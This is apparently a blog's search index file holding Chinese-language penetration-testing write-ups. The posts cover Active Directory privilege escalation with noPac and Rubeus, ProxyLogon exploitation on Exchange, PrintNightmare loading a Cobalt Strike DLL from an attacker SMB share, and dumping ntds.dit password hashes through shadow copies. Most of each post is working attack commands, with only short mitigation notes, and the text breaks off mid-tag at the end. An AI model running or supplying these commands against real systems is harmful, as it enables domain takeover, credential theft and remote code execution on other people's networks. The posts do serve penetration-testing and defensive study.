<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-42287/CVE-2021-42278 域权限提升</title>
      <link href="/2021/12/17/cve-2021-42287-cve-2021-42278-yu-quan-xian-ti-sheng/"/>
      <url>/2021/12/17/cve-2021-42287-cve-2021-42278-yu-quan-xian-ti-sheng/</url>
      
        <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows Server 2022</p><p>Windows Server 2019</p><p>Windows Server 2016</p><p>all editions Windows Server 2012 R2</p><p>Windows Server 2012</p><p>Windows Server 2008 R2</p><p>Windows Server 2008 Service Pack 2</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>CVE-2021-42287/CVE-2021-42278 samAccountName spoofing</p><h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h3><p>机器账户的名字一般来说应该以<code>$</code>结尾，但AD没有对域内机器账户名做验证，这就导致攻击者可通过利用计算机账户sAMAccountName欺骗来模仿域控</p><p>正常机器账户如下，非法的如dctest：</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image.png" alt="img" style="zoom:50%;"><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a>CVE-2021-42278</h3><p>在 kerberos 认证过程中，用户要访问某个服务，在获取服务票据 ST 之前，需要申请 TGT票据。该漏洞的核心为：当请求的服务票 ST 没有被 KDC 找到时，KDC 会自动在尾部添加 <code>$</code> 重新搜索。</p><p><strong>将上述漏洞进行结合利用进行域内权限提升，流程如下：</strong></p><ol><li>建立一个机器账户，并修改账户的<code>sAMAccountName</code>为域控的机器账户名，例如域控机器名为DC$，这里建立的机器账户<code>sAMAccountName</code>则修改为DC；</li><li>使用该账户向KDC的AS申请到TGT；</li><li>修改1中建立的机器账户的<code>sAMAccountName</code>修改为其他名，不与DC相同即可；</li><li>使用2中申请到的TGT，利用<a href="https://cloud.tencent.com/developer/article/1802247">S4U2self</a>协议并假冒域控的身份向KDC申请用于访问域控ST。KDC服务一般默认安装在域控中，且此时DC这个<code>sAMAccountName</code>已经不存在了，这就导致在向域控的KDC申请ST的时候，域控找不到DC这个账户。又因为漏洞CVE-2021-42278的缘故 ，找不到DC账户的KDC会在<code>sAMAccountName</code>名后添加<code>$</code>继续搜索，即在Account Database 中寻找DC账户。这样因为域控名为DC是存在的，KDC就会用域控密钥签发用于访问域控的高权限ST；</li><li>DCsync，攻击达成。</li></ol><blockquote><p>前提：需要对属性 <code>sAMAccountName</code> 和 <code>servicePrincipalName</code> 具有写权限。由于默认情况下 <a href="https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota">MAQ</a> 特性，域内普通用户可以创建 10 个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地测试环境：</p><ul><li>域名<code>aaron.com</code></li><li>域控win2012r2(<code>172.16.84.5</code>)，sAMAccountName:<code>WIN-K0LG8TT3AGH$</code>，域控administrator</li><li>域主机win10(<code>172.16.84.4</code>),sAMAccountName:<code>WINDOWS10$</code>，登录名win10</li></ul><h3 id="一、使用武器化工具noPac"><a href="#一、使用武器化工具noPac" class="headerlink" title="一、使用武器化工具noPac"></a>一、使用武器化工具<a href="https://github.com/cube0x0/noPac">noPac</a></h3><p><strong>1.使用域内账户验证是否存在漏洞</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">noPac.exe scan -domain DOMAIN.COM -user USERNAME -pass PASSWORD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image1.png" alt="img" style="zoom:50%;"><p><strong>2.攻击达成</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">noPac.exe -domain DOMAIN.COM -user USERNAME -pass PASSWORD /dc MACHINENAME.DOMAIN.COM /mAccount dctest /mPassword 1qaz2wsx /service cifs /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image 2.png" alt="img" style="zoom:50%;"><p>测试成功</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image 3.png" alt="img" style="zoom:50%;"><h3 id="二、使用Powermad和Rubeus"><a href="#二、使用Powermad和Rubeus" class="headerlink" title="二、使用Powermad和Rubeus"></a>二、使用<a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>和<a href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><h4 id="修改powershell的执行策略，倒入ps1脚本，创建机器账户test"><a href="#修改powershell的执行策略，倒入ps1脚本，创建机器账户test" class="headerlink" title="修改powershell的执行策略，倒入ps1脚本，创建机器账户test"></a><strong>修改powershell的执行策略，倒入ps1脚本，创建机器账户test</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-ExecutionPolicy unRestrictedNew-MachineAccount -MachineAccount test -Domain aaron.com -DomainController WIN-K0LG8TT3AGH.aaron.com -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>![img](<a href="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic">https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic</a> for samAccountName spoofing/image4.png)</p><p>查看创建成功</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image5.png" alt="img" style="zoom:50%;"><h4 id="删除该账户的SPN记录"><a href="#删除该账户的SPN记录" class="headerlink" title="删除该账户的SPN记录"></a><strong>删除该账户的SPN记录</strong></h4><p>查询发现该账户存在SPN记录</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image6.png" alt="img" style="zoom:50%;"><p>使用脚本<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">powerview</a>删除</p><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-DomainObject "CN=test,CN=Computers,DC=aaron,DC=com" -Clear 'serviceprincipalname' -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](<a href="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic">https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic</a> for samAccountName spoofing/image7.png)</p><p>查看发现SPN记录已经被删除</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image8.png" alt="img" style="zoom:50%;"><h4 id="重新设置机器名，与域控机器名相同，去除"><a href="#重新设置机器名，与域控机器名相同，去除" class="headerlink" title="重新设置机器名，与域控机器名相同，去除$"></a>重新设置机器名，与域控机器名相同，去除<code>$</code></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-MachineAccountAttribute -MachineAccount test -Value "WIN-K0LG8TT3AGH" -Attribute samaccountname -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image9.png" alt="img" style="zoom:50%;"><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image10.png" alt="img" style="zoom:50%;"><p>此时机器账户test的<code>sAMAccountName</code>值已经变成域控的对应值缺少<code>$</code></p><h4 id="使用Rubeus请求TGT"><a href="#使用Rubeus请求TGT" class="headerlink" title="使用Rubeus请求TGT"></a><strong>使用Rubeus请求TGT</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Rubeus.exe asktgt /user:WIN-K0LG8TT3AGH /password:PASSWORD /domian:aaron.com /dc:WIN-K0LG8TT3AGH.aaron.com /nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](<a href="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic">https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic</a> for samAccountName spoofing/image11.png)</p><h4 id="恢复账户属性"><a href="#恢复账户属性" class="headerlink" title="恢复账户属性"></a><strong>恢复账户属性</strong></h4><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">Set-MachineAccountAttribute -MachineAccount test -Value "test" -Attribute samaccountname -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](<a href="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic">https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic</a> for samAccountName spoofing/image12.png)</p><h4 id="Request-S4U2self（获取票据）"><a href="#Request-S4U2self（获取票据）" class="headerlink" title="Request S4U2self（获取票据）"></a><strong>Request S4U2self（获取票据）</strong></h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-K0LG8TT3AGH.aaron.com /self /altservice:LDAP/WIN-K0LG8TT3AGH.aaron.com /ptt /ticket:上面生成的ticket或者可签发CIFS的票据Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-K0LG8TT3AGH.aaron.com /self /altservice:cifs/WIN-K0LG8TT3AGH.aaron.com /ptt /ticket:上面生成的ticket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![img](<a href="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic">https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic</a> for samAccountName spoofing/image13.png)</p><p>查看内存中的票据，发现已经存在 dc 的 ldap和cifs 服务票据：</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image14.png" alt="img" style="zoom:50%;"><p>测试是否有效</p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.3/pic for samAccountName spoofing/image15.png" alt="img" style="zoom:50%;"><p>后面可以利用高权限的票据Dcsync</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ol><li>微软官方已推出补丁：KB5008602、KB5008380</li><li>通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链。</li></ol>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
          <category> CVE-2021 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Kerberos协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-26855 proxylogon复现</title>
      <link href="/2021/08/30/cve-2021-26855-proxylogon-fu-xian/"/>
      <url>/2021/08/30/cve-2021-26855-proxylogon-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p>CVE-2021-26855又名proxylogon，是利用ssrf绕过权限验证，再结合同期Exchange的其他漏洞例如文件写入（<strong>CVE-2021-27065</strong>）等漏洞进行无权限rce</p><h4 id="受害版本"><a href="#受害版本" class="headerlink" title="受害版本"></a>受害版本</h4><p>Exchange 2013 Versions &lt; 15.00.1497.012</p><p>Exchange 2016 CU18 &lt; 15.01.2106.013</p><p>Exchange 2016 CU19 &lt; 15.01.2176.009</p><p>Exchange 2019 CU7 &lt; 15.02.0721.013</p><p>Exchange 2019 CU8 &lt; 15.02.0792.010</p><h4 id="具体过程如下："><a href="#具体过程如下：" class="headerlink" title="具体过程如下："></a>具体过程如下：</h4><p>1、 通过SSRF漏洞攻击,访问autodiscover.xml泄露LegacyDN信息<br>2、 在通过LegacyDN, 获取SID<br>3.、然后通过合法的SID,获取exchange的有效cookie<br>4.、最后通过有效的cookie,对OABVirtualDirectory对象进行恶意操作，写入一句话木马，达到控制目标的效果.</p><h4 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h4><p>win2012r2+exchange 2016cu16.iso</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h5><p>漏洞探测包：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-1.png"></p><p>ssrf原因为请求包中的cookie中X-BEResource，存在漏洞主机会有<strong>X-FEServer和X-CalculatedBETarget</strong>两个cookie。其中需要X-FEServer的信息进行进一步利用</p><h5 id="读取-autodiscover-xml"><a href="#读取-autodiscover-xml" class="headerlink" title="读取 autodiscover.xml"></a>读取 autodiscover.xml</h5><p>Autodiscover(自动发现)是自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。如果用户账户是域账户且当前位于域环境中，通过自动发现功能用户无需输入任何凭证信息即可登陆邮箱。</p><p>读取对应账户的legacyDN</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-2.png"></p><h5 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h5><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE</a></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/CVE_repaly@1.0/CVE-2021/pic/CVE2021-26855-3.png"></p><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>有幸在内网实战碰见后端三台负载的exchange存在proxylogon，且由于环境限制纯手工复现一番，这里把出现的坑一一列出：</p><h5 id="1、16进制问题"><a href="#1、16进制问题" class="headerlink" title="1、16进制问题"></a>1、16进制问题</h5><p>在读取完legacyDn后需要通过legacyDn拼接16进制：<code>\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00</code>进行发包读取sid，这里python脚本会自动转换，但是手动burp发包的话则需要一个个字节编辑</p><h5 id="2、后端负载情况下的FQDN"><a href="#2、后端负载情况下的FQDN" class="headerlink" title="2、后端负载情况下的FQDN"></a>2、后端负载情况下的FQDN</h5><p>常见的proxylogon的脚本都会通过读取返回包头中的<code>X-FEServer</code>字段也就是域内主机名，而后在通过请求包的cookie字段<code>X-BEResource</code>对该主机的444端口的接口进行ssrf利用，例如：</p><p><code>X-BEResource: Admin@WIN-DC:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;</code></p><p>实战过程中通过<code>X-FEServer</code>读取的值而后利用ssrf并不能访问，在读取sid的步骤中返回的是500状态码</p><p>而后通过试错，利用返回包中的<code>X-CalculatedBETarget</code>的字段值，也就是负载的其中一台exchange域内主机名进行ssrf访问444端口的接口成功</p><h5 id="3、读取OAB-ID失败"><a href="#3、读取OAB-ID失败" class="headerlink" title="3、读取OAB ID失败"></a>3、读取OAB ID失败</h5><p>常见的exp在获取ASP.NET_SessionId和msExchEcpCanary之后，再尝试获取OAB ID使用的接口为</p><p><code>/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s</code></p><p>而在上次的实战中，使用该接口返回包中<strong>Identity</strong>的值一直为null，在渗透测试最后一天的下午又找到一个exp，使用的接口为：</p><p><code>/ecp/DDI/DDIService.svc/GetList?schema=VirtualDirectory&amp;msExchEcpCanary={msExchEcpCanary}&amp;#~1941962754; ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}</code></p><p>最终成功读取OAB ID，并写入webshell，附上该exp 的链接：<a href="https://github.com/hosch3n/ProxyVulns/blob/main/26855.py">https://github.com/hosch3n/ProxyVulns/blob/main/26855.py</a></p><h5 id="4、请求包头缺失"><a href="#4、请求包头缺失" class="headerlink" title="4、请求包头缺失"></a>4、请求包头缺失</h5><p>因为特别是从读取sid后的几步，比对了很多exp的，详细的exp能比简易的exp多出3个请求头字段，且都验证有效、必需。</p>]]></content>
      
      
      <categories>
          
          <category> Microsoft Exchange </category>
          
          <category> CVE-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exchange </tag>
            
            <tag> SSRF </tag>
            
            <tag> Proxylogon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1675复现</title>
      <link href="/2021/07/20/cve-2021-1675-fu-xian/"/>
      <url>/2021/07/20/cve-2021-1675-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="1、漏洞危害"><a href="#1、漏洞危害" class="headerlink" title="1、漏洞危害"></a>1、漏洞危害</h2><p>CVE-2021-1675（后分配至编号<strong>CVE-2021-34527</strong>）这个漏洞级别属于稍次于<strong>Zerologon</strong>的打域利器之一。和以往的打印机协议中继/委派系列，危害度和利用条件基本在同一维度</p><p>影响版本</p><pre class="line-numbers language-none"><code class="language-none">Windows Server 2019Windows Server 2016Windows Server 2012 R2Windows Server 2012Windows Server 2008 R2Windows Server 2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、漏洞利用条件"><a href="#2、漏洞利用条件" class="headerlink" title="2、漏洞利用条件"></a>2、漏洞利用条件</h2><ul><li>一个域内账户密码或者该机器账户密码</li><li>驱动器的绝对路径</li></ul><h2 id="3、复现步骤"><a href="#3、复现步骤" class="headerlink" title="3、复现步骤"></a>3、复现步骤</h2><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>漏洞环境安装存在问题的移步</p><pre class="line-numbers language-none"><code class="language-none">域控：windows server2019（172.16.84.7）域主机：windows server2012R2（172.16.84.6）攻击机：kali（172.16.84.3）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞脚本利用"><a href="#漏洞脚本利用" class="headerlink" title="漏洞脚本利用"></a>漏洞脚本利用</h4><h5 id="1）使用rpcdump扫描漏洞指纹"><a href="#1）使用rpcdump扫描漏洞指纹" class="headerlink" title="1）使用rpcdump扫描漏洞指纹"></a>1）使用rpcdump扫描漏洞指纹</h5><p>使用impacket包中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">rpcdump.py</a> 查看漏洞指纹，一般返回包含MS-RPRN或者MS-PAR则该主机可能存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723173253186.png" alt="image-20210723173253186"></p><h5 id="2）漏洞前期环境部署"><a href="#2）漏洞前期环境部署" class="headerlink" title="2）漏洞前期环境部署"></a>2）漏洞前期环境部署</h5><p>需要使用smb服务放置恶意dll文件供受害主机读取，这里在攻击机上配置samba服务</p><p>创建共享文件夹/home/share后，修改samba的smb.conf文件，在结尾添加配置：</p><pre class="line-numbers language-none"><code class="language-none">[share]    path=/home/share    available = yes    browseable = yes    public = yes    writable = yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后重新启动smbd服务</p><p>恶意dll使用cs生成的dll测试即可，生成后存放至smb的共享文件夹中</p><p>关于是否需要确保域控能直接访问到该smb文件这个点上，笔者还是不太明确，看了几个文章，都在强调需要DC能直接访问到smb，但是笔者自己环境测试的DC为windows server2019，补丁更新到了2019年3月，实际是做了安全策略控制的，导致访问smb会提示“不能访问共享文件夹”，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182033487.png" alt="image-20210723182033487"></p><p>此DC仍然能够使用exp成功打出，咱们继续往下看</p><h5 id="3）漏洞利用"><a href="#3）漏洞利用" class="headerlink" title="3）漏洞利用"></a>3）漏洞利用</h5><h6 id="本地提权使用"><a href="#本地提权使用" class="headerlink" title="本地提权使用"></a><strong>本地提权使用</strong></h6><p>微软先前提供的补丁仅仅针对该漏洞的本地提权的恶意利用方式进行修补，选用脚本来自：<a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a> ，这里就不复现了</p><h6 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a><strong>Python脚本利用</strong></h6><p>cs生成64位的dll，上传至smb后，确保DC和域主机能ping通我们的smb服务器，下面安装<a href="https://github.com/cube0x0/CVE-2021-1675">exp</a>需要的环境。</p><p>由于该exp作者对impacket包进行了部分修改，所以需要卸载原先安装的impacket环境，用<a href="https://github.com/cube0x0/impacket">修改后的impacket</a></p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com/cube0x0/impacketcd impacketpython3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装后，使用域主机账户密码进行漏洞利用：</p><p><code>python3 CVE-2021-1675.py &lt;FQDN&gt;/&lt;USER_Name&gt;:&lt;PASSWORD&gt;@&lt;DC IP&gt; '\\&lt;ATTACKER_IP&gt;\smb\rev.dll'</code></p><p>如下：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.1/pic/image-20210723182804857.png" alt="image-20210723182804857"></p><p>cs上获取域控的会话：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210723183220532.png" alt="image-20210723183220532"></p><h6 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a><strong>mimikatz利用</strong></h6><p>利用mimikatz对漏洞进行复现</p><p>命令：</p><pre class="line-numbers language-none"><code class="language-none">misc::printnightmare /library:\\172.16.84.3\share\artifact.dll /server:172.16.84.7 /authuser:&lt;域主机用户&gt; /authdomain:&lt;域名&gt; /authpassword:&lt;域主机密码&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于使用dll为原生cs的dll，这里日常报毒查杀</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830111551285.png" alt="image-20210830111551285"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830110707554.png"></p><p>本文仅仅测试可行性，这里添加白名单继续执行，成功上线</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830120926159.png" alt="image-20210830120926159"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830113130749.png" alt="image-20210830113130749"></p><h4 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h4><p>原先测试环境为DC windows server2012R2，虽然域控能够访问开启的smb服务且前期指纹探测确认存在漏洞，但是使用python脚本进行实际攻击下一直提示rpc_s_access_denied，具体原因不是很明确（猜测为windows自己的杀毒进程阻拦），原github同样存在类似问题反馈<a href="https://github.com/cube0x0/CVE-2021-1675/issues/9">https://github.com/cube0x0/CVE-2021-1675/issues/9</a></p><h2 id="4、修复建议"><a href="#4、修复建议" class="headerlink" title="4、修复建议"></a>4、修复建议</h2><p>建议关闭Spooler服务</p><pre class="line-numbers language-none"><code class="language-none">//cmdnet stop spooler &amp;&amp; sc config spooler start=disabled //powershellStop-Service SpoolerREG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或：</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.2/pic/image-20210830121139370.png" alt="image-20210830121139370"></p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p>1、<a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p><p>2、<a href="https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw">https://mp.weixin.qq.com/s/k4OwCcJJxm-UHMdVdfBCIw</a></p><p>3、<a href="https://zhuanlan.zhihu.com/p/386251108">https://zhuanlan.zhihu.com/p/386251108</a></p><p>4、<a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></p>]]></content>
      
      
      <categories>
          
          <category> windows内网 </category>
          
          <category> CVE-2021 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> PrintNightmare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网初探-windows hash提取</title>
      <link href="/2021/07/01/nei-wang-chu-tan-windows-hash-ti-qu/"/>
      <url>/2021/07/01/nei-wang-chu-tan-windows-hash-ti-qu/</url>
      
        <content type="html"><![CDATA[<h3 id="1、hash存放"><a href="#1、hash存放" class="headerlink" title="1、hash存放"></a>1、hash存放</h3><p>C:\Windows\NTDS\Ntds.dit存放包括但不限于有关域用户、域组、用户hash等信息。其中域用户的密码hash由存储在system注册表配置单元中的密钥进行二次加密。</p><p>而在工作组环境下用户密码等信息存储在SAM文件中，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。</p><h3 id="2、ntds-dit获取"><a href="#2、ntds-dit获取" class="headerlink" title="2、ntds.dit获取"></a>2、ntds.dit获取</h3><p>上文知ntds.dit文件被Windows锁定，必须要利用卷影拷贝服务*(Volume Shadow Copy Service，VSS)*才能获取该文件的副本。VSS本质上是属于快照技术的一种，主要用于备份和恢复，即使目标文件被处于锁定状态。</p><p>获取ntds.dit副本步骤如下：</p><ol><li>创建目标主机的卷影拷贝（包含Windows上的全部文件）</li><li>然后在创建的卷影拷贝中将ntds.dit复制出来</li><li>最后将当菜创建的卷影拷贝删除</li></ol><h4 id="windows原生vssadmin工具"><a href="#windows原生vssadmin工具" class="headerlink" title="windows原生vssadmin工具"></a>windows原生vssadmin工具</h4><p>vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝。*(适用范围Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008)*</p><p>以下操作需要域管权限：</p><p>1）首先创建C盘的卷影副本</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow /for=C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629103236252.png" alt="image-20210629103236252"></p><p>2）将ntds.dit文件从卷影副本中拷贝出来，而后删除卷影副本即可</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629103756810.png" alt="image-20210629103756810"></p><h4 id="通过vbs脚本"><a href="#通过vbs脚本" class="headerlink" title="通过vbs脚本"></a>通过vbs脚本</h4><p>脚本地址：<a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>该脚本本质上通过wmi对shadowcopy进行操作的，与vssadmin类似，命令的流程：启动-创建卷影副本-拷贝ntds.dit-根据ID删除卷影副本</p><pre class="line-numbers language-none"><code class="language-none">cscript Desktop\vssown.vbs /start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110100489.png" alt="image-20210629110100489"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110325908.png" alt="image-20210629110325908"></p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629110751660.png" alt="image-20210629110751660"></p><p>同样使用wmi实现vss(卷影拷贝服务)还有powershell脚本：<a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</a></p><h4 id="原生工具Ntdsutil-exe创建快照"><a href="#原生工具Ntdsutil-exe创建快照" class="headerlink" title="原生工具Ntdsutil.exe创建快照"></a>原生工具Ntdsutil.exe创建快照</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，不仅可以本地操作域控主机，还可以通过域内主机在域控上远程操作(需要域管权限)</p><p>以下操作需要域管权限：</p><p>1）为主机创建一个包含所有文件的快照，该快照中的文件在复制时同样不受windows锁定机制的影响。创建之后需要通过ID将快照挂在在磁盘中</p><pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &lt;ID&gt;" quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629112333076.png" alt="image-20210629112333076"></p><p>2）复制出ntds.dit后，取消快照挂载并删除快照</p><p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.0/pic/image-20210629112619433.png" alt="image-20210629112619433"></p><p><img 